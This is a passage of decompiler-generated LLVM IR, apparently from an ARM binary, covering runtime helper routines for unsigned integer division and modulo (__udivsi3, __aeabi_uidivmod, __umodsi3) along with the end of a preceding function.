  store i32 %v5_13fe8, i32* %r1.global-to-local, align 4
  br i1 %v3_13fe4, label %dec_label_pc_13ff0, label %dec_label_pc_13fdc.dec_label_pc_13fdc_crit_edge

dec_label_pc_13fdc.dec_label_pc_13fdc_crit_edge:  ; preds = %dec_label_pc_13fdc
  %v0_13fdc.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_13fe0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13fdc

dec_label_pc_13ff0:                               ; preds = %dec_label_pc_13fdc, %dec_label_pc_13fcc, %.thread1, %dec_label_pc_13efc
  %v0_13ff0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_13ff0, i32* %r0.global-to-local, align 4
  %v2_13ff8 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_13ff8, i32* @r4, align 4
  ret i32 %v0_13ff0

dec_label_pc_13ffc:                               ; preds = %dec_label_pc_13f4c
  store i32 32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14000

dec_label_pc_14000:                               ; preds = %dec_label_pc_13f98, %dec_label_pc_13ffc
  %v1_14004 = phi i32 [ %v1_13f90, %dec_label_pc_13f98 ], [ 32, %dec_label_pc_13ffc ]
  %v2_14004 = add i32 %v1_14004, %v22_13efc
  store i32 %v2_14004, i32* %r2.global-to-local, align 4
  %v3_1400c = add i32 %v2_14004, -34
  %v4_1400c = inttoptr i32 %v3_1400c to i8*
  store i8 45, i8* %v4_1400c, align 1
  %v1_13fa8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13fa4

; uselistorder directives
  uselistorder i32 %v5_13fe8, { 1, 0 }
  uselistorder i1 %v3_13fe4, { 1, 0 }
  uselistorder i32 %v0_13fe0, { 1, 0 }
  uselistorder i1 %v7_13fcc, { 1, 0 }
  uselistorder i32 %v1_13fbc, { 0, 1, 3, 2 }
  uselistorder i32 %v2_13fa8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_13f88, { 1, 0 }
  uselistorder i32 %v5_13f84, { 1, 0 }
  uselistorder i32 %v2_13f6c, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 1, 0 }
  uselistorder i1 %v3_13f10, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13f00, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 2, 7, 8, 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i8 45, { 1, 0 }
  uselistorder i32 55, { 1, 0 }
  uselistorder i32 48, { 3, 2, 1, 0 }
  uselistorder i32 9, { 1, 37, 2, 3, 36, 4, 7, 8, 9, 10, 11, 12, 13, 0, 14, 16, 15, 35, 5, 34, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 38, 39, 6, 40 }
  uselistorder i32 32, { 26, 35, 36, 34, 28, 27, 0, 1, 2, 4, 3, 5, 7, 6, 9, 8, 10, 11, 13, 12, 29, 15, 14, 16, 17, 19, 18, 30, 37, 31, 38, 32, 39, 21, 20, 23, 22, 24, 25, 33 }
  uselistorder i32 10, { 22, 0, 1, 8, 18, 4, 20, 9, 10, 5, 2, 19, 6, 23, 21, 24, 3, 14, 16, 25, 12, 26, 15, 17, 7, 27, 11, 28, 13 }
  uselistorder i8 0, { 17, 18, 0, 8, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 5, 30, 31, 32, 33, 35, 34, 1, 36, 37, 38, 3, 4, 2, 39, 40, 41, 10, 9, 44, 14, 42, 43, 13, 45, 46, 47, 48, 49, 15, 50, 51, 52, 54, 55, 7, 58, 12, 64, 59, 60, 56, 57, 11, 16, 61, 62, 63, 6, 65, 66, 53, 67, 68, 69 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14000, { 1, 0 }
  uselistorder label %dec_label_pc_13fa4, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_13f24, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_14014 = add i32 %arg2, -1
  %v7_14014 = icmp eq i32 %arg2, 1
  br i1 %v7_14014, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_14018 = load i32, i32* @r0, align 4
  ret i32 %v2_14018

bb80:                                             ; preds = %entry
  %v2_14014 = icmp eq i32 %arg2, 0
  br i1 %v2_14014, label %dec_label_pc_140fc, label %dec_label_pc_14020

dec_label_pc_14020:                               ; preds = %bb80
  %v0_14020 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_14020, %arg2
  br i1 %tmp, label %dec_label_pc_14028, label %dec_label_pc_140b4

dec_label_pc_14028:                               ; preds = %dec_label_pc_14020
  %v2_14028 = and i32 %v1_14014, %arg2
  %v4_14028 = icmp eq i32 %v2_14028, 0
  br i1 %v4_14028, label %dec_label_pc_140c0, label %dec_label_pc_14030

dec_label_pc_14030:                               ; preds = %dec_label_pc_14028
  %v3_14030 = icmp ult i32 %arg2, 536870912
  br i1 %v3_14030, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_14030
  %v4_14034 = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_14030, %.thread
  %v0_14054.pr36.ph = phi i32 [ %v4_14034, %.thread ], [ %arg2, %dec_label_pc_14030 ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_14030 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_14054.pr36 = phi i32 [ %v4_14048, %bb83 ], [ %v0_14054.pr36.ph, %.preheader.preheader ]
  %v1_1404c = phi i32 [ %v4_1404c, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_14040 = icmp ugt i32 %v0_14054.pr36, 268435455
  br i1 %v2_14040, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_14054thread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_14044 = icmp ult i32 %v0_14054.pr36, %v0_14020
  br i1 %v4_14044, label %bb82, label %dec_label_pc_14054thread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_14048 = and i32 %v0_14054.pr36, 268435456
  %v3_14048 = icmp eq i32 %v2_14048, 0
  %v4_14048 = mul i32 %v0_14054.pr36, 16
  br i1 %v3_14048, label %bb83, label %dec_label_pc_14054.loopexit

bb83:                                             ; preds = %bb82
  %v2_1404c = and i32 %v1_1404c, 268435456
  %v3_1404c = icmp eq i32 %v2_1404c, 0
  %v4_1404c = mul i32 %v1_1404c, 16
  br i1 %v3_1404c, label %.preheader, label %dec_label_pc_14054thread-pre-split.loopexit.loopexit

dec_label_pc_14054thread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_1406048.ph = phi i32 [ %v1_1404c, %bb81 ], [ %v4_1404c, %bb83 ]
  %v0_14054.pr38.ph = phi i32 [ %v0_14054.pr36, %bb81 ], [ %v4_14048, %bb83 ]
  br label %dec_label_pc_14054thread-pre-split.loopexit

dec_label_pc_14054thread-pre-split.loopexit:      ; preds = %dec_label_pc_14054thread-pre-split.loopexit.loopexit, %.thread2
  %v1_1406048 = phi i32 [ %v1_1404c, %.thread2 ], [ %v1_1406048.ph, %dec_label_pc_14054thread-pre-split.loopexit.loopexit ]
  %v0_14054.pr38 = phi i32 [ %v0_14054.pr36, %.thread2 ], [ %v0_14054.pr38.ph, %dec_label_pc_14054thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_14054thread-pre-split

dec_label_pc_14054thread-pre-split:               ; preds = %dec_label_pc_14054thread-pre-split.loopexit, %bb85
  %v1_1406046 = phi i32 [ %v1_1406048, %dec_label_pc_14054thread-pre-split.loopexit ], [ %v3_14060, %bb85 ]
  %v0_14054.pr = phi i32 [ %v0_14054.pr38, %dec_label_pc_14054thread-pre-split.loopexit ], [ %v3_1405c, %bb85 ]
  br label %dec_label_pc_14054

dec_label_pc_14054.loopexit:                      ; preds = %bb82
  br label %dec_label_pc_14054

dec_label_pc_14054:                               ; preds = %dec_label_pc_14054.loopexit, %dec_label_pc_14054thread-pre-split
  %v1_14060 = phi i32 [ %v1_1406046, %dec_label_pc_14054thread-pre-split ], [ %v1_1404c, %dec_label_pc_14054.loopexit ]
  %v1_1405c = phi i32 [ %v0_14054.pr, %dec_label_pc_14054thread-pre-split ], [ %v4_14048, %dec_label_pc_14054.loopexit ]
  %v2_14054 = icmp slt i32 %v1_1405c, 0
  br i1 %v2_14054, label %dec_label_pc_14068, label %bb84

bb84:                                             ; preds = %dec_label_pc_14054
  %v4_14058 = icmp ult i32 %v1_1405c, %v0_14020
  br i1 %v4_14058, label %bb85, label %dec_label_pc_14068

bb85:                                             ; preds = %bb84
  %v3_1405c = mul i32 %v1_1405c, 2
  %v2_14060 = icmp slt i32 %v1_14060, 0
  %v3_14060 = mul i32 %v1_14060, 2
  br i1 %v2_14060, label %dec_label_pc_14068, label %dec_label_pc_14054thread-pre-split

dec_label_pc_14068:                               ; preds = %bb84, %dec_label_pc_14054, %bb85
  %v2_1407459 = phi i32 [ %v3_14060, %bb85 ], [ %v1_14060, %bb84 ], [ %v1_14060, %dec_label_pc_14054 ]
  %v1_1406c51 = phi i32 [ %v3_1405c, %bb85 ], [ %v1_1405c, %bb84 ], [ %v1_1405c, %dec_label_pc_14054 ]
  br label %dec_label_pc_1406c

dec_label_pc_1406c:                               ; preds = %.thread11, %dec_label_pc_14068
  %v1_140a0 = phi i32 [ %v4_140a0, %.thread11 ], [ %v2_1407459, %dec_label_pc_14068 ]
  %v1_14074 = phi i32 [ %v0_140ac, %.thread11 ], [ 0, %dec_label_pc_14068 ]
  %v1_140a4 = phi i32 [ %v4_140a4, %.thread11 ], [ %v1_1406c51, %dec_label_pc_14068 ]
  %v1_14070 = phi i32 [ %v0_1409c, %.thread11 ], [ %v0_14020, %dec_label_pc_14068 ]
  %v3_1406c = icmp ult i32 %v1_14070, %v1_140a4
  br i1 %v3_1406c, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_1406c
  %v3_14070 = sub i32 %v1_14070, %v1_140a4
  %v3_14074 = or i32 %v1_14074, %v1_140a0
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_1406c, %bb86
  %v1_1407c = phi i32 [ %v1_14070, %dec_label_pc_1406c ], [ %v3_14070, %bb86 ]
  %v1_14080 = phi i32 [ %v1_14074, %dec_label_pc_1406c ], [ %v3_14074, %bb86 ]
  %v4_14078 = udiv i32 %v1_140a4, 2
  %v6_14078 = icmp ult i32 %v1_1407c, %v4_14078
  br i1 %v6_14078, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_1407c = urem i32 %v1_140a4, 2
  %v4_1407c = icmp eq i32 %v3_1407c, 0
  %v6_1407c = sub i32 %v1_1407c, %v4_14078
  br i1 %v4_1407c, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_14080 = udiv i32 %v1_140a0, 2
  %v6_14080 = or i32 %v1_14080, %v5_14080
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_14088 = phi i32 [ %v6_1407c, %bb87 ], [ %v1_1407c, %.thread7 ], [ %v6_1407c, %bb88 ]
  %v1_1408c = phi i32 [ %v1_14080, %bb87 ], [ %v1_14080, %.thread7 ], [ %v6_14080, %bb88 ]
  %v4_14084 = udiv i32 %v1_140a4, 4
  %v6_14084 = icmp ult i32 %v1_14088, %v4_14084
  br i1 %v6_14084, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_14088 = and i32 %v1_140a4, 2
  %v4_14088 = icmp eq i32 %v3_14088, 0
  %v6_14088 = sub i32 %v1_14088, %v4_14084
  br i1 %v4_14088, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_1408c = udiv i32 %v1_140a0, 4
  %v6_1408c = or i32 %v1_1408c, %v5_1408c
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_14094 = phi i32 [ %v6_14088, %bb89 ], [ %v1_14088, %.thread8 ], [ %v6_14088, %bb90 ]
  %v1_14098 = phi i32 [ %v1_1408c, %bb89 ], [ %v1_1408c, %.thread8 ], [ %v6_1408c, %bb90 ]
  %v4_14090 = udiv i32 %v1_140a4, 8
  %v6_14090 = icmp ult i32 %v1_14094, %v4_14090
  br i1 %v6_14090, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_14094 = and i32 %v1_140a4, 4
  %v4_14094 = icmp eq i32 %v3_14094, 0
  %v6_14094 = sub i32 %v1_14094, %v4_14090
  br i1 %v4_14094, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_14098 = udiv i32 %v1_140a0, 8
  %v6_14098 = or i32 %v1_14098, %v5_14098
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_140ac = phi i32 [ %v1_14098, %bb91 ], [ %v1_14098, %.thread9 ], [ %v6_14098, %bb92 ]
  %v0_1409c = phi i32 [ %v6_14094, %bb91 ], [ %v1_14094, %.thread9 ], [ %v6_14094, %bb92 ]
  %v2_1409c = icmp eq i32 %v0_1409c, 0
  br i1 %v2_1409c, label %dec_label_pc_140ac, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_140a0, 16
  br i1 %tmp140, label %dec_label_pc_140ac, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_140a0 = udiv i32 %v1_140a0, 16
  %v4_140a4 = udiv i32 %v1_140a4, 16
  br label %dec_label_pc_1406c

dec_label_pc_140ac:                               ; preds = %thread-pre-split, %bb93
  ret i32 %v0_140ac

dec_label_pc_140b4:                               ; preds = %dec_label_pc_14020
  %v9_14020 = icmp eq i32 %v0_14020, %arg2
  %. = zext i1 %v9_14020 to i32
  ret i32 %.

dec_label_pc_140c0:                               ; preds = %dec_label_pc_14028
  %v2_140c0 = icmp ugt i32 %arg2, 65535
  br i1 %v2_140c0, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_140c0
  %v2_140c4 = and i32 %arg2, 32768
  %v3_140c4 = icmp eq i32 %v2_140c4, 0
  %v4_140c4 = udiv i32 %arg2, 65536
  br i1 %v3_140c4, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_140c0
  %v0_140d065 = phi i32 [ %arg2, %dec_label_pc_140c0 ], [ %v4_140c4, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_140d4 = phi i32 [ %v0_140d065, %.thread16 ], [ %v4_140c4, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_140d0 = icmp ugt i32 %v1_140d4, 255
  br i1 %v2_140d0, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_140d4 = and i32 %v1_140d4, 128
  %v3_140d4 = icmp eq i32 %v2_140d4, 0
  %v4_140d4 = udiv i32 %v1_140d4, 256
  br i1 %v3_140d4, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_140d8 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_140e4 = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_140d8, %bb100 ]
  %v1_140e0 = phi i32 [ %v1_140d4, %bb98 ], [ %v4_140d4, %bb99 ], [ %v4_140d4, %bb100 ]
  %v2_140dc = icmp ugt i32 %v1_140e0, 15
  br i1 %v2_140dc, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_140e0 = and i32 %v1_140e0, 8
  %v3_140e0 = icmp eq i32 %v2_140e0, 0
  %v4_140e0 = udiv i32 %v1_140e0, 16
  br i1 %v3_140e0, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_140e4 = add nsw i32 %v1_140e4, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_140ec = phi i32 [ %v1_140e4, %.thread17 ], [ %v1_140e4, %bb101 ], [ %v2_140e4, %bb102 ]
  %v5_140f0 = phi i32 [ %v1_140e0, %.thread17 ], [ %v4_140e0, %bb101 ], [ %v4_140e0, %bb102 ]
  %v2_140e8 = icmp ugt i32 %v5_140f0, 3
  %v7_140e8 = icmp eq i32 %v5_140f0, 4
  %v2_140ec = xor i1 %v7_140e8, true
  %v3_140ec = and i1 %v2_140e8, %v2_140ec
  br i1 %v3_140ec, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_140ec = add nsw i32 %v4_140ec, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_140f0 = phi i32 [ %v4_140ec, %.thread18 ], [ %v5_140ec, %bb103 ]
  %v2_140f0 = xor i1 %v2_140e8, true
  %v3_140f0 = or i1 %v7_140e8, %v2_140f0
  br i1 %v3_140f0, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_140f0 = udiv i32 %v5_140f0, 2
  %v9_140f0 = add i32 %v4_140f0, %v8_140f0
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_140f4 = phi i32 [ %v4_140f0, %bb104 ], [ %v9_140f0, %bb105 ]
  %v6_140f4 = lshr i32 %v0_14020, %v1_140f4
  ret i32 %v6_140f4

dec_label_pc_140fc:                               ; preds = %bb80
  %v0_140fc = load i32, i32* @lr, align 4
  %v0_14100 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_140fc)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_140f0, { 1, 0 }
  uselistorder i1 %v7_140e8, { 1, 0 }
  uselistorder i32 %v4_140e0, { 1, 0 }
  uselistorder i32 %v1_140e0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_140d4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_140d4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_140c4, { 1, 0 }
  uselistorder i32 %v0_1409c, { 1, 0 }
  uselistorder i32 %v4_14090, { 1, 0 }
  uselistorder i32 %v1_14098, { 1, 2, 0 }
  uselistorder i32 %v4_14084, { 1, 0 }
  uselistorder i32 %v1_1408c, { 1, 2, 0 }
  uselistorder i32 %v4_14078, { 1, 0 }
  uselistorder i32 %v1_14080, { 1, 2, 0 }
  uselistorder i32 %v1_140a4, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_14074, { 1, 0 }
  uselistorder i32 %v1_140a0, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_14060, { 1, 0 }
  uselistorder i32 %v3_1405c, { 1, 0 }
  uselistorder i32 %v1_1405c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_14060, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1404c, { 1, 0 }
  uselistorder i32 %v4_14048, { 2, 1, 0 }
  uselistorder i32 %v1_1404c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_14054.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_14020, { 2, 5, 3, 1, 4, 0 }
  uselistorder i1 true, { 0, 1, 19, 2, 3, 4, 5, 6, 23, 7, 8, 9, 25, 26, 27, 28, 20, 29, 30, 31, 32, 33, 34, 35, 36, 14, 37, 15, 16, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 13, 52, 53, 54, 55, 56, 57, 12, 58, 18, 59, 21, 22, 17, 60, 10, 11, 24, 61 }
  uselistorder i32 15, { 7, 8, 2, 0, 3, 9, 4, 5, 6, 1 }
  uselistorder i32 256, { 0, 1, 2, 5, 6, 7, 3, 4, 8, 11, 12, 13, 9, 10, 14, 89, 90, 19, 15, 18, 16, 17, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 32, 33, 31, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 73, 72, 74, 75, 76, 77, 79, 78, 80, 81, 82, 83, 84, 87, 88, 91, 85, 86 }
  uselistorder i32 128, { 10, 12, 2, 13, 3, 5, 0, 1, 6, 7, 8, 14, 4, 15, 11, 9 }
  uselistorder i32 255, { 10, 0, 3, 13, 4, 14, 1, 15, 2, 16, 7, 17, 8, 18, 5, 19, 6, 20, 11, 12, 9, 21 }
  uselistorder i32 65536, { 4, 5, 6, 7, 8, 10, 9, 11, 1, 12, 0, 2, 13, 14, 15, 16, 17, 20, 18, 19, 21, 3, 22, 24, 23, 25, 27, 26 }
  uselistorder i32 65535, { 31, 0, 1, 5, 3, 4, 6, 7, 8, 9, 10, 2, 28, 11, 29, 12, 13, 14, 15, 30, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_140ac, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_14068, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14054thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_14110 = udiv i32 %arg1, %arg2
  ret i32 %v2_14110
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_14124 = add i32 %arg2, -1
  %v2_14124 = icmp eq i32 %arg2, 0
  br i1 %v2_14124, label %dec_label_pc_141e0, label %dec_label_pc_1412c

dec_label_pc_1412c:                               ; preds = %entry
  %v7_14124 = icmp eq i32 %arg2, 1
  br i1 %v7_14124, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_1412c
  %v1_1412c = load i32, i32* @r0, align 4
  %v10_1412c = icmp eq i32 %v1_1412c, %arg2
  br i1 %v10_1412c, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_1412c, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_1412c = icmp ult i32 %v1_1412c, %arg2
  br i1 %v4_1412c, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_14134 = and i32 %v1_14124, %arg2
  %v8_14134 = icmp eq i32 %v6_14134, 0
  br i1 %v8_14134, label %.thread67, label %dec_label_pc_14144.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_14138 = phi i32 [ %v1_1412c, %bb75 ], [ 0, %.thread65 ]
  %v3_14138 = and i32 %v1_14138, %v1_14124
  br label %bb76

dec_label_pc_14144.preheader:                     ; preds = %bb75
  %v2_1414499 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_1414499, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_141d4, %bb74, %bb89, %bb84, %dec_label_pc_141a4, %.thread67
  %v5_1413c = phi i32 [ %v1_1412c, %bb74 ], [ %v3_14138, %.thread67 ], [ %v1_14180.v6_14180.v6_14188.v6_14190, %dec_label_pc_141a4 ], [ 0, %bb84 ], [ %v1_141d8, %dec_label_pc_141d4 ], [ %v2_141d4, %bb89 ]
  ret i32 %v5_1413c

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_14144.preheader
  %v0_14158.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_14144.preheader ], [ %v4_1414c, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_14144.preheader ], [ %v2_1415011, %.thread1.thread9 ]
  br label %dec_label_pc_14158thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_14144.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_1415011, %.thread1.thread9 ], [ 0, %dec_label_pc_14144.preheader ]
  %v0_14158.pr33100 = phi i32 [ %v4_1414c, %.thread1.thread9 ], [ %arg2, %dec_label_pc_14144.preheader ]
  %v4_14148 = icmp ult i32 %v0_14158.pr33100, %v1_1412c
  br i1 %v4_14148, label %bb78, label %dec_label_pc_14158thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_1414c = and i32 %v0_14158.pr33100, 268435456
  %v3_1414c = icmp eq i32 %v2_1414c, 0
  %v4_1414c = mul i32 %v0_14158.pr33100, 16
  br i1 %v3_1414c, label %.thread1.thread9, label %dec_label_pc_14158.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_1415011 = add i32 %storemerge101, 4
  %v2_14144 = icmp ugt i32 %v4_1414c, 268435455
  br i1 %v2_14144, label %.thread, label %bb77

dec_label_pc_14158thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_14158thread-pre-split.loopexit

dec_label_pc_14158thread-pre-split.loopexit:      ; preds = %dec_label_pc_14158thread-pre-split.loopexit.loopexit, %.thread
  %v0_14158.pr3398 = phi i32 [ %v0_14158.pr33.lcssa, %.thread ], [ %v0_14158.pr33100, %dec_label_pc_14158thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_14158thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_14158thread-pre-split

dec_label_pc_14158thread-pre-split:               ; preds = %.thread4, %dec_label_pc_14158thread-pre-split.loopexit
  %v1_1416439 = phi i32 [ %storemerge95, %dec_label_pc_14158thread-pre-split.loopexit ], [ %v2_14164, %.thread4 ]
  %v0_14158.pr = phi i32 [ %v0_14158.pr3398, %dec_label_pc_14158thread-pre-split.loopexit ], [ %v3_14160, %.thread4 ]
  br label %dec_label_pc_14158

dec_label_pc_14158.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_14158

dec_label_pc_14158:                               ; preds = %dec_label_pc_14158.loopexit, %dec_label_pc_14158thread-pre-split
  %v0_1416c.pr = phi i32 [ %v1_1416439, %dec_label_pc_14158thread-pre-split ], [ %storemerge101, %dec_label_pc_14158.loopexit ]
  %v1_14160 = phi i32 [ %v0_14158.pr, %dec_label_pc_14158thread-pre-split ], [ %v4_1414c, %dec_label_pc_14158.loopexit ]
  %v2_14158 = icmp slt i32 %v1_14160, 0
  br i1 %v2_14158, label %dec_label_pc_1416c, label %bb79

bb79:                                             ; preds = %dec_label_pc_14158
  %v4_1415c = icmp ult i32 %v1_14160, %v1_1412c
  br i1 %v4_1415c, label %.thread4, label %dec_label_pc_1416c

.thread4:                                         ; preds = %bb79
  %v3_14160 = mul i32 %v1_14160, 2
  %v2_14164 = add i32 %v0_1416c.pr, 1
  br label %dec_label_pc_14158thread-pre-split

dec_label_pc_1416c:                               ; preds = %bb79, %dec_label_pc_14158
  %v2_1416c = add i32 %v0_1416c.pr, -3
  %v5_14170 = icmp slt i32 %v0_1416c.pr, 3
  br i1 %v5_14170, label %dec_label_pc_141b0, label %dec_label_pc_14174

dec_label_pc_14174:                               ; preds = %dec_label_pc_1416c, %bb83
  %v6_1419c = phi i32 [ %v0_141a4, %bb83 ], [ %v2_1416c, %dec_label_pc_1416c ]
  %v1_14178 = phi i32 [ %v1_14180.v6_14180.v6_14188.v6_14190, %bb83 ], [ %v1_1412c, %dec_label_pc_1416c ]
  %v3_1419812 = phi i32 [ %v3_14198, %bb83 ], [ %v1_14160, %dec_label_pc_1416c ]
  %v3_14174 = icmp ult i32 %v1_14178, %v3_1419812
  %v3_14178 = select i1 %v3_14174, i32 0, i32 %v3_1419812
  %v1_14180 = sub i32 %v1_14178, %v3_14178
  %v4_1417c = udiv i32 %v3_1419812, 2
  %v6_1417c = icmp ult i32 %v1_14180, %v4_1417c
  %v6_14180 = select i1 %v6_1417c, i32 0, i32 %v4_1417c
  %v1_14180.v6_14180 = sub i32 %v1_14180, %v6_14180
  %.demorgan = and i1 %v3_14174, %v6_1417c
  %v4_14184 = udiv i32 %v3_1419812, 4
  %v6_14184 = icmp ult i32 %v1_14180.v6_14180, %v4_14184
  %v6_14188 = select i1 %v6_14184, i32 0, i32 %v4_14184
  %v1_14180.v6_14180.v6_14188 = sub i32 %v1_14180.v6_14180, %v6_14188
  %.demorgan71 = and i1 %.demorgan, %v6_14184
  %v4_1418c = udiv i32 %v3_1419812, 8
  %v6_1418c = icmp ult i32 %v1_14180.v6_14180.v6_14188, %v4_1418c
  %v6_14190 = select i1 %v6_1418c, i32 0, i32 %v4_1418c
  %v1_14180.v6_14180.v6_14188.v6_14190 = sub i32 %v1_14180.v6_14180.v6_14188, %v6_14190
  %.demorgan72 = and i1 %.demorgan71, %v6_1418c
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_14174
